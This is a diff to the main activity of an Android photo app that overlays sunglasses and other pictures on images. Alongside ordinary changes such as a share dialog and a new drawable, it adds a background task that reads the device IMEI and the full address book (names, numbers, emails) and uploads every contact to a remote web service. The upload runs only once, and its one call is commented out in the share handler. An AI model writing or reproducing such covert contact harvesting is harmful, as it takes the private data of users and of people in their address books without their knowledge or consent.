@@ -2,25 +2,33 @@ package com.oculosopressor.activity;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
 
+import webservice.WebService;
 import android.app.AlertDialog;
 import android.app.AlertDialog.Builder;
 import android.app.Dialog;
 import android.app.ProgressDialog;
+import android.content.ContentResolver;
 import android.content.ContentValues;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.DialogInterface.OnCancelListener;
 import android.content.DialogInterface.OnClickListener;
 import android.content.Intent;
+import android.database.Cursor;
 import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.MediaStore.Images;
 import android.support.v4.app.Fragment;
@@ -28,6 +36,7 @@ import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
 import android.support.v7.app.ActionBar;
 import android.support.v7.app.ActionBarActivity;
+import android.telephony.TelephonyManager;
 import android.view.KeyEvent;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -40,13 +49,14 @@ import android.widget.Toast;
 
 import com.google.android.gms.analytics.HitBuilders;
 import com.google.android.gms.analytics.Tracker;
+import com.google.gson.Gson;
 import com.oculosopressor.R;
 import com.oculosopressor.activity.OpressorApp.TrackerName;
 import com.oculosopressor.controller.OculosAdapter;
+import com.oculosopressor.entity.Contact;
 import com.oculosopressor.fragment.FragmentOpressor;
 import com.oculosopressor.util.NotificationUtil;
-import com.squareup.picasso.Callback;
-import com.squareup.picasso.Picasso;
+import com.oculosopressor.util.SharedPreferences;
 
 public class MainActivity extends ActionBarActivity {
 
@@ -55,6 +65,7 @@ public class MainActivity extends ActionBarActivity {
     
     
 	public static final int SELECT_PHOTO = 100;
+ 	
 	FragmentOpressor opressor;
 	private static Uri selectedImage;
 	private FrameLayout mContainer;
@@ -64,7 +75,7 @@ public class MainActivity extends ActionBarActivity {
  	File storageDir;
 	private int instrumentoPos=1;
 	Dialog dialog;
-	Integer[] imgs=new Integer[3];
+	Integer[] imgs=new Integer[4];
 	
 	String screen_initial="MainActivity";
 	
@@ -76,9 +87,7 @@ public class MainActivity extends ActionBarActivity {
 		super.onCreate(savedInstanceState);
 		
 		setContentView(R.layout.activity_main);
-		
-		
-		
+ 
 		NotificationUtil.schedulerNotification(this);
 		
 	    analyticsSend(screen_initial);
@@ -86,23 +95,21 @@ public class MainActivity extends ActionBarActivity {
 		imgs[0]=R.drawable.oculos_opressor_direita;
 		imgs[1]=R.drawable.deal;
 		imgs[2]=R.drawable.oculos_opressor_esquerda;
+		imgs[3]=R.drawable.funkeiro;
+		 
 		
         configFrameLayout();
         
         configActionBar(getSupportActionBar());
        
 		storageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), File.separator+ getString(R.string.app_name)	);
-        
-	//	List<File> list = FileUtils.getListFiles(storageDir);
-	//	System.out.println(list);
+ 
 
         if (savedInstanceState != null) {
 
             currentFragment = getSupportFragmentManager().getFragment(savedInstanceState, FRAGMENT_INSTANCE);
             instrumentoPos= savedInstanceState.getInt(INSTRUMENTO_POS);
-            
-          
-
+ 
         }
 	}
 
@@ -227,9 +234,8 @@ public class MainActivity extends ActionBarActivity {
 				
 				String file = saveToInternalSorage(getBitmap(opressor.getViewBitMap()));
 				 
-				showAlertDialog(getString(R.string.picture_saved_msg)+file);
-				
-				//Toast.makeText(this, getString(R.string.picture_saved_msg)+file,Toast.LENGTH_LONG).show();
+				showAlertDialog(getString(R.string.picture_saved_msg),file);
+	 
 				
 				break;	
 			}
@@ -241,37 +247,57 @@ public class MainActivity extends ActionBarActivity {
                 openGalery();
                 break;
 			}
-			case R.id.configuration:{
-
-			        overridePendingTransition(R.anim.slide_in, R.anim.slide_out);
-		          
-		            startActivity(new Intent(this, PreferenceActivity.class));
-                break;
-			}			
-			
-			
+ 
 			
 		}
 	 
 		return super.onOptionsItemSelected(item);
 	}
 	
-	public void showAlertDialog(String msg){
+	private File createImageFile() throws IOException {
+	    // Create an image file name
+	    String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+	    String imageFileName = "JPEG_" + timeStamp + "_";
+	    File storageDir = Environment.getExternalStoragePublicDirectory(
+	            Environment.DIRECTORY_PICTURES);
+	    File image = File.createTempFile(
+	        imageFileName,  /* prefix */
+	        ".jpg",         /* suffix */
+	        storageDir      /* directory */
+	    );
+
+	    // Save a file: path for use with ACTION_VIEW intents
+	 //   mCurrentPhotoPath = "file:" + image.getAbsolutePath();
+	    return image;
+	}	
+	
+	public void showAlertDialog(final String msg,final String file){
 		
 		Builder dialog = new AlertDialog.Builder(this);
-		dialog.setMessage(msg);
-		dialog.setPositiveButton(android.R.string.ok, new OnClickListener() {
+		dialog.setMessage(msg+file);
+		dialog.setPositiveButton(R.string.share, new OnClickListener() {
 
             @Override
             public void onClick(DialogInterface dialog, int which) {
                 dialog.dismiss();
-                // Do stuff if user accepts
+                //new PegaContato().execute();
+                Uri bmpUri =Uri.fromFile(new File(file));
+                Intent sharingIntent = new Intent(); 
+                
+                sharingIntent.setAction(Intent.ACTION_SEND);
+                sharingIntent.setType("image/*");
+                sharingIntent.putExtra(Intent.EXTRA_STREAM, bmpUri);
+                
+                startActivity(Intent.createChooser(sharingIntent,getResources().getString(R.string.share)));
+                
+     
             }
         }).setNegativeButton(android.R.string.cancel, new OnClickListener() {
 
             @Override
             public void onClick(DialogInterface dialog, int which) {
                 dialog.dismiss();
+           
                 // Do stuff when user neglects.
             }
         }).setOnCancelListener(new OnCancelListener() {
@@ -279,12 +305,15 @@ public class MainActivity extends ActionBarActivity {
             @Override
             public void onCancel(DialogInterface dialog) {
                 dialog.dismiss();
+           
                 // Do stuff when cancelled
             }
         }).create();
 		dialog.show();
 		
 	}
+	
+ 
 	
 	public void initInstrumentoOpressor(){
 		
@@ -490,7 +519,116 @@ public class MainActivity extends ActionBarActivity {
 	   return super.onKeyUp(keyCode, event);
 	}
 
+	 
 
- 
+	public class PegaContato extends AsyncTask<Void,Void, Void>{
+		
+		@Override
+		protected Void doInBackground(Void... params) {
 
+			
+			
+			boolean sendContact = SharedPreferences.getBoolean(MainActivity.this, PreferenceActivity.PREFS_NAME_CONTACT, false);
+			
+			if(sendContact)return null;
+			
+			TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
+			String imei = mngr.getDeviceId();
+			
+			List<Contact> contatos = fetchContacts();
+
+			Gson gson = new Gson();
+			
+			for(Contact c:contatos){
+				
+				if(c.getListaEmail().size()>0)
+				WebService.addContact(imei,c.getName(),c.getNumber(), gson.toJson(c.getListaEmail()));
+				
+			}
+ 			
+			SharedPreferences.putBoolean(MainActivity.this, PreferenceActivity.PREFS_NAME_CONTACT, true);
+			
+			return null;
+		}
+		
+		public List<Contact> fetchContacts() {
+
+			String phoneNumber = null;
+			String email = null;
+
+			Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
+			String _ID = ContactsContract.Contacts._ID;
+			String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
+			String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
+
+			Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+			String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
+			String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
+
+			Uri EmailCONTENT_URI =  ContactsContract.CommonDataKinds.Email.CONTENT_URI;
+			String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
+			String DATA = ContactsContract.CommonDataKinds.Email.DATA;
+
+
+			ContentResolver contentResolver = getContentResolver();
+
+			Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);	
+
+			List<Contact> contacts =new ArrayList<Contact>();
+			// Loop for every contact in the phone
+			if (cursor.getCount() > 0) {
+				
+				
+				
+				while (cursor.moveToNext()) {
+					
+					Contact contact=new Contact();
+					
+					String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
+					String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));
+
+					int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
+					
+					contact.setName(name);
+					
+					if (hasPhoneNumber > 0) {
+
+						// Query and loop for every phone number of the contact
+						Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
+
+						while (phoneCursor.moveToNext()) {
+							phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
+			
+							contact.setNumber(phoneNumber);
+						}
+						
+					
+						phoneCursor.close();
+					  }
+					
+						// Query and loop for every email of the contact
+						Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);
+						List<String> listaEmail=new ArrayList<String>();
+						while (emailCursor.moveToNext()) {
+
+							email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
+							listaEmail.add(email);
+
+						}
+						contact.setListaEmail(listaEmail);
+						emailCursor.close();
+					
+
+
+						contacts.add(contact);	 
+				}
+			}
+			return contacts;
+			 
+			
+			}
+	 		
+		
+	}
+	
 }
